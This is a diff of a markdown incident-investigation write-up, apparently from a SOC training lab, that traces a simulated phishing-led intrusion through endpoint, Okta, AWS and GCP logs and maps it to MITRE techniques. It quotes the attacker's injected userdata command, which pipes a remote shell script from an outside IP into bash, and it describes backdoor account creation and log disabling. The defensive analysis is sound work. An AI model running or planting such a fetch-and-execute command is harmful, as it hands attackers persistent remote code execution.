@@ -169,7 +169,7 @@ CrowdStrikeAlerts
 
 We will need to take a different approach: Since we've ruled out any query working with the known payload filename, sender IP, sender email, and destination user/email. Let's inspect deeper regarding the type of payload: We know the malicious file is a .exe file that will be run, and looking at the "Names" column of the table, we see "User Execution: Malicious File" and "Malicious PowerShell Execution":
 
-![](screenshots/2.14.png)
+![](screenshots/a2.14.png)
 
 One of these will undoubtedly be the "Name" of the alert that fires when the user clicks on the phishing link and report.exe runs.
 
@@ -178,7 +178,7 @@ On top of that, we know that the time of the email was 7:08:40 AM on May 22nd, a
 ![](screenshots/a2.15.png)
 ![](screenshots/a2.16.png)
 
-#### Looks like that did it! We can see the "Name" of the alerts is "malicious powershell execution", and the attacker's objective is "gain access," which lines up perfectly with what presumably occurred in the initial compromise of running report.exe. 
+### Looks like that did it! We can see the "Name" of the alerts is "malicious powershell execution", and the attacker's objective is "gain access," which lines up perfectly with what presumably occurred in the initial compromise of running report.exe. 
 
 This maps cleanly to MITRE technique **T1204.002**: User Execution: Malicious File.
 
@@ -196,7 +196,7 @@ So scrolling through the 14 results from the query of true positives on the infe
 
 On top of that, we unfortunately don't see anything relating to commandline or child/parent process IDs, so we can't find what the report.exe spawned exactly.
 
-#### We do see credential harvesting from LSASS though on the infected machine!:
+### We do see credential harvesting from LSASS though on the infected machine!:
 
 ![](screenshots/sub.png)
 
@@ -220,7 +220,7 @@ Of the given agentIDs/DisplayNames:
 
 ![](screenshots/ae2.png)
 
-#### We can see our lateral movement alert to win11d via smb! 
+### We can see our lateral movement alert to win11d via smb! 
 
 This was almost certainly achieved using the credentials harvested prior. This specifically maps to **T1021.002**: "Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user"
 
@@ -228,7 +228,7 @@ This was almost certainly achieved using the credentials harvested prior. This s
 
 ## 4.5: Scope of Infection & Network Scanning
 
-#### Removing the win11a filter, we now that we see at least 7 machines have been infected:
+### Removing the win11a filter, we now that we see at least 7 machines have been infected:
 
 ![](screenshots/new.png)
 ![](screenshots/new1.png)
@@ -263,7 +263,7 @@ Let's remove the file-only port filter to see all ports that dropped connections
 
 ![](screenshots/a4.4.png)
 
-#### We can see when the destination IP is 10.0.1.200 that the very commonly used ports' connections are being dropped at the same time, which strongly points to a targeted automated scan. This also is a strong indicator that this is a file server (or another important device) that the attacker really wants access to.
+### We can see when the destination IP is 10.0.1.200 that the very commonly used ports' connections are being dropped at the same time, which strongly points to a targeted automated scan. This also is a strong indicator that this is a file server (or another important device) that the attacker really wants access to.
 
 The other destination IPs though almost seem random as well as their target ports, which seems more like a randomized optimistic scan, just hoping something random is vulnerable:
 
@@ -289,7 +289,7 @@ So now let's look at successful movement to potential external IPs, since we kno
 
 We know that any outgoing connection would require a DNS resolution first, to translate the IP to a domain name, so we can try filtering by port 53 first:
 
-#### Here we have some valuable info: There are 4 connections out to IP=192.0.2.100, all with command-and-control (C2) descriptions. This is highly indicative of that IP indeed being the C2 beacon, but there may be multiple…
+### Here we have some valuable info: There are 4 connections out to IP=192.0.2.100, all with command-and-control (C2) descriptions. This is highly indicative of that IP indeed being the C2 beacon, but there may be multiple…
 
 Keeping "deviceCustomString1" (which seems to tell us the means by which the data was delivered in the connection), "Activity == end" to confirm it was a successful connection, and switching to see all Dest ports, we can see:
 
@@ -299,7 +299,7 @@ There are a few things to note here: first off, it looks like there are actually
 
 #### Looking at these connections specifically though, one of them has a MASSIVE amount of outgoing bytes - all going to IP 192.0.2.100. They use port 443 this time most likely to blend in with trusted traffic.
 
-#### We can assume at this point that 192.0.2.100 is the main attacker C2 server, and that the CDN connection to it (pictured above) is the major data exfiltration connection we are looking for!
+### We can assume at this point that 192.0.2.100 is the main attacker C2 server, and that the CDN connection to it (pictured above) is the major data exfiltration connection we are looking for!
 
 Now that that's settled, we want to check that 192.0.2.100 is the only C2 beacon, so we can run a command showing only external (can't start with 10.) dest IP addresses when devicecustommstring1 is "command-and-control":
 
@@ -321,7 +321,7 @@ At this point with confirmed credentials harvested, lateral movements, data exfi
 
 ![](screenshots/a3.1.png)
 
-#### Looking at the objectives of the alerts, we see "Maintain Presence," In the alerts with "Maintain Presence", we see a C2 beacon detection as well as a C2 Network connection...
+### Looking at the objectives of the alerts, we see "Maintain Presence," In the alerts with "Maintain Presence", we see a C2 beacon detection as well as a C2 Network connection...
 
 This seems inherently like it would be the backdoor persistence we are looking for, but this could very well just be continuous pinging of the C2 server to ensure connection is still enabled. We don't see any new users created on windows AD (no privilege escalation, and maintain persistence is only on win11a) so let's check softwares and utilities to see if backdoor access was created instead in the cloud/MFA.
 
@@ -335,7 +335,7 @@ First we will view the table at the time of the attack:
 
 ![](screenshots/2.png)
 
-#### We immediately see many red flags right from the get go. Just like the rest of the attack, we see all 36 Okta events fired at the same exact time during the attack, which tells us that these were all automated. 
+### We immediately see many red flags right from the get go. Just like the rest of the attack, we see all 36 Okta events fired at the same exact time during the attack, which tells us that these were all automated. 
 
 We are seeing extremely concerning EventMessages such as Grant user super admin role to mirage, then "Reset all MFA factors for user CEO PKWork", "Deactivate SMS factor for user Priya Sharma", "Enroll new TOTP factor for attacker-controlled device", etc.
 
@@ -353,7 +353,9 @@ We see 6 users accounts successfully compromised - clearly of varying levels of 
 
 And again, at the same time - so obviously automated… Even logins to the same account are from different areas/stats completely (same exact event message like "Authentication of user via MFA" multiple times for the same users in different locations) which obviously indicates impossible travel (if we didn't already know the accounts were compromised).
 
-#### We can certainly conclude that the privilege escalation indeed came from credential harvesting of multiple accounts and bypassing of Okta MFA security measures. This would map to MITRE technique **T1556.006**: "Disabling or weakening MFA policies to bypass secondary verification."
+### We can certainly conclude that the privilege escalation indeed came from credential harvesting of multiple accounts and bypassing of Okta MFA security measures. 
+
+This would map to MITRE technique **T1556.006**: "Disabling or weakening MFA policies to bypass secondary verification."
 
 ---
 
@@ -363,7 +365,7 @@ And again, at the same time - so obviously automated… Even logins to the same 
 
 ![](screenshots/4.12.png)
 
-#### We can see there is an event that we had looked over before: Create API token. 
+### We can see there is an event that we had looked over before: Create API token. 
 
 API tokens can be created on Okta by high level users (Mirage after escalation to super user) to bypass the whole login flow and even persist after passwords change. Expanding the event, we can also see the Original Target tells us that a "backdoor API" was created.
 
@@ -383,7 +385,7 @@ Already we see a user being created and when expanding the event:
 
 ![](screenshots/4.16.png)
 
-#### We can see this is indeed the backdoor user created that has no mfa authenticated and is literally named "backdoor-svc."
+### We can see this is indeed the backdoor user created that has no mfa authenticated and is literally named "backdoor-svc."
 
 #### Examining more events regarding the new user, we can see when expanding this one that the new user (backdoor-svc) is being given admin privileges:
 
@@ -397,13 +399,13 @@ There seem to be lots of indicators of malicious actions here, and even though t
 
 ![](screenshots/4.27.png)
 
-#### This means that anyone on the internet can view an instance spun up by that group in AWS!
+### This means that anyone on the internet can view an instance spun up by that group in AWS!
 
 The next event that caught my eye was mirage running an instance of p3.16xlarge:
 
 ![](screenshots/4.19.png)
 
-#### After doing quick research, I found this is a high-performance, GPU-accelerated AWS EC2 instance often used by attackers to mine crypto, password cracking, and more - and the attacker ran the instance 5 times!
+### After doing quick research, I found this is a high-performance, GPU-accelerated AWS EC2 instance often used by attackers to mine crypto, password cracking, and more - and the attacker ran the instance 5 times!
 
 Next I noticed that the attacker attempts to stop logging and deleted previous logs for the mirage account:
 
@@ -431,7 +433,7 @@ Above we can see a short bash script:
 curl https://185.220.101.55/shell.sh | bash
 ```
 
-#### This bash script is now modified into that specific instance via userdata so whenever it next boots, it connects to the attacker server at https://185.220.101.55 and runs the shell script hosted on that site - which can be updated/modified by the attacker at any time.
+### This bash script is now modified into that specific instance via userdata so whenever it next boots, it connects to the attacker server at https://185.220.101.55 and runs the shell script hosted on that site - which can be updated/modified by the attacker at any time.
 
 So this means the attacker doesn't need to access the AWS environment again for the script to be edited. The attacker surely attempted to do this in a way where the victim wouldn't notice until the instance was next booted, but luckily our logs showed up in Sentinel despite him/her deleting the logs within Cloud Trail.
 
@@ -449,7 +451,7 @@ Now for the most critical events - we can see Mirage accessing what sounds like 
 ![](screenshots/4.25.png)
 ![](screenshots/4.26.png)
 
-#### This shows Mirage accessing api-keys-production.json, hr/employee-records-full.csv, and finance/2026-budget-final.xlsx . We can also see the source IP is 198.51.100.42, which means the attacker most likely just downloaded the sensitive info straight to his device in Moscow. 
+### This shows Mirage accessing api-keys-production.json, hr/employee-records-full.csv, and finance/2026-budget-final.xlsx . We can also see the source IP is 198.51.100.42, which means the attacker most likely just downloaded the sensitive info straight to his device in Moscow. 
 
 I wanted to clarify this to see if this info was involved in the exfiltration from 4.6 (from 10.0.1.50), but looks like it isn't. That connection must've been primarily sensitive files from srvfile.
 
@@ -472,7 +474,7 @@ Getting familiar with the table, it looks pretty similar to AWS in terms of the 
 ![](screenshots/9.2.png)
 ![](screenshots/9.4.png)
 
-#### Similarly to AWS, mirage is creating a backdoor account first-thing (backdoor-svc-gcp) and giving it admin/owner privileges as we can see above.
+### Similarly to AWS, mirage is creating a backdoor account first-thing (backdoor-svc-gcp) and giving it admin/owner privileges as we can see above.
 
 ![](screenshots/9.3.png)
 
@@ -501,7 +503,7 @@ Disks: [{"boot":true,"initializeParams":{"sourceImage":"projects/ubuntu-os-cloud
 
 ![](screenshots/9.7.png)
 
-#### Then it lists confidential info bucket with storage.objects.list and goes on to access 2 sensitive documents (financial-report-2026.xlsx & employee-pii-export.csv) with storage.objects.get.
+### Then it lists confidential info bucket with storage.objects.list and goes on to access 2 sensitive documents (financial-report-2026.xlsx & employee-pii-export.csv) with storage.objects.get.
 
 ![](screenshots/9.8.png)
 
@@ -512,7 +514,7 @@ The next two logs are modifying the "sink" which is essentially the setting that
 sinkName: projects/pocaas-prod-01/sinks/export-all-logs
 ```
 
-#### This essentially blocks logging to SIEMS and other external resources.
+### This essentially blocks logging to SIEMS and other external resources.
 
 Then the second one updates the sink request:
 
@@ -522,7 +524,7 @@ sinkName: projects/pocaas-prod-01/sinks/_Default
 Sink: {"name":"_Default","disabled":true}
 ```
 
-#### Which as we can see turns off the sink logging insideFlist the GCP.
+#### Which as we can see turns off the sink logging inside the GCP.
 
 Next the account of Jane.Smith is used to list all of the VM instances in the project, and get the details of one VM (web-frontend-01) with: compute.instances.list and compute.instances.get
 
@@ -534,7 +536,7 @@ Bucket: pocaas-deploy-artifacts
 Object: releases/v3.1.0/app.jar
 ```
 
-#### Then the same account stops and redeploys an instance of VM web-frontend-01 with instances.stop and instances.start.
+### Then the same account stops and redeploys an instance of VM web-frontend-01 with instances.stop and instances.start.
 
 #### After that bob.jones account is used to read project IAM permissions, list all service accounts in project, and list VMs again with "GetIamPolicy," "ListServiceAccounts," and "instances.list."
 
@@ -563,7 +565,7 @@ roles/iam.serviceAccountTokenCreator
 → applied to deploy-pipeline@
 ```
 
-#### This essentially allows deploy-pipeline to generate access tokens, impersonate CI/CD pipelines, and move laterally in the cloud.
+### This essentially allows deploy-pipeline to generate access tokens, impersonate CI/CD pipelines, and move laterally in the cloud.
 
 ---
 
@@ -601,7 +603,7 @@ For the IP addresses acting as backup beacons from part 4.6 (198.51.100.42 and 2
 
 ![](screenshots/8.02.png)
 
-This confirms both 203.0.113.77 and 198.51.100.42 are indeed attacker-controlled hosts, and that the same machines conducting C2 communications out of the attacker network were also being used to operate the AWS mirage and backdoor accounts, directly linking the two attack chains.
+### This confirms both 203.0.113.77 and 198.51.100.42 are indeed attacker-controlled hosts, and that the same machines conducting C2 communications out of the attacker network were also being used to operate the AWS mirage and backdoor accounts, directly linking the two attack chains.
 
 As for the other hosts on the victim network: Win11a, Win11b, Win11c, Win11d, srv-file01, srv-dc, it-ws01, and devws01, I thought they would come up more but didn't really beyond the crowdstrike alerts in part 4.5. In conclusion though, across the entire compromised environment, every infected host (listed above including win11a as well obviously) was observed running malicious PowerShell executables at some point during the attack. LSASS credential dumping was confirmed on srv-file01 and it-ws01 (and win11a), indicating the attacker harvested domain credentials to perform lateral movement. Win11b and it-ws01 were also involved in sensitive file staging, consistent with data being aggregated for exfiltration. devws01 stood out as the most critical endpoint finding - beyond PowerShell execution, it showed security tool tampering and suspected ransomware behavior, indicating potential that the attacker encrypted sensitive source code (since we know it's a dev workstation) and extended beyond just exfiltration and cryptomining.
 
@@ -613,7 +615,7 @@ In part 4.5, I noted that srvfile potentially had files encrypted due to this qu
 ![](screenshots/new.png)
 ![](screenshots/new1.png)
 
-I was under the impression that srvfile and src_dc were also subject to ransomware compromise, but when I filtered out the false_positives, as seen above in the refined query's results, it turns out that only the developer workstation was subject to it.
+#### I was under the impression that srvfile and src_dc were also subject to ransomware compromise, but when I filtered out the false_positives, as seen above in the refined query's results, it turns out that only the developer workstation was subject to it.
 
 In the grand scheme of things, this really doesn't change much in terms of the overall logistics of the attack - the C2 beacon(s) were connected to the originally infected workstation (win11a) through DNS/HTTPS channels and data was exfiltrated from the hosts that staged the sensitive files (win11b and it-ws01) - which were sent to win11a - as well as presumably encryption/device info regarding the ransomware on on devws01, and large volumes of that data were sent through the C2 channels to external attacker devices.
 
@@ -622,7 +624,9 @@ For user eve.hacker on AWS and GCP, who we assume was a decoy to draw attention 
 ---
 
 ## 4.14: Conclusion
+#### This was a multi-stage attack from an attacker infrastructure/network based in Moscow, whose initial attack vector began with a phishing email link to mirage's workstation: "win11a". The initial payload, "report.exe" was executed on that work station and havoc immediately ensued. The executable ran a script that spawned a number of sophisticated automated attacks all at the same time. These attacks included credential harvesting, lateral movement to many other hosts, file staging, encryption of (presumably) source code on a developer workstation, local network data exfiltration through C2 beacon channels, MFA manipulation and account takeover in Okta, backdoor users created in Okta and cloud platforms, cloud IAM rules manipulated in both privilege escalation and user creation, cloud compute resources harvested with expensive cryptomining instances, exfiltration of sensitive cloud files, injection of obfuscated commands (to reach out to attacker server) in previously made cloud instances, API keys stolen in Okta and GCP, and other malicious activity.
 
+#### The attack mimicked many real world techniques/processes as well as network (both attacker's and victim's) infrastructure. Real world scenarios for such an attack would most likely occur on a larger scale, but many of the principle ideas seemed to be highly transferable to typical blue team SOC work/experience!
 
 ---
 
